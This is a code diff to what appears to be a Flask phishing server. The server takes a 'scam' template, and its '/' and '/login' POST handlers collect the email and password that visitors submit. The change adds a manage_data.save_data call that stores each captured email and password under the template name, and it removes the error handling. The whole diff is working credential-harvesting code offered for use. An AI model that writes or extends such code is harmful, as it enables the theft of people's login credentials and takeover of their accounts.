@@ -1,5 +1,5 @@
 from flask import Flask, render_template, request
-from scripts import props
+from scripts import props, manage_data
 import click
 import subprocess
 
@@ -18,7 +18,6 @@ class Server:
     def __init__(self, scam):
         global template 
         template = scam
-
     # *************  GET METHODS  *************
 
     @app.route('/', methods=['GET'])
@@ -36,24 +35,24 @@ class Server:
     @app.route('/', methods=['POST'])
     def get_index():
         global template
+        
         email = request.form['email']
         password = request.form['password']
 
         props.show_data(email, password)
+        manage_data.save_data(template, email, password)
 
         return render_template(f"{template}/index.html")
 
     @app.route('/login', methods=['POST'])
     def get_login():
         global template
-        try:
-            email = request.form['email']
-            password = request.form['password']
 
-            props.show_data(email, password)
+        email = request.form['email']
+        password = request.form['password']
 
-        except:
-            print('Nada')
+        props.show_data(email, password)
+        manage_data.save_data(template, email, password)
 
         return render_template(f"{template}/index.html")
 
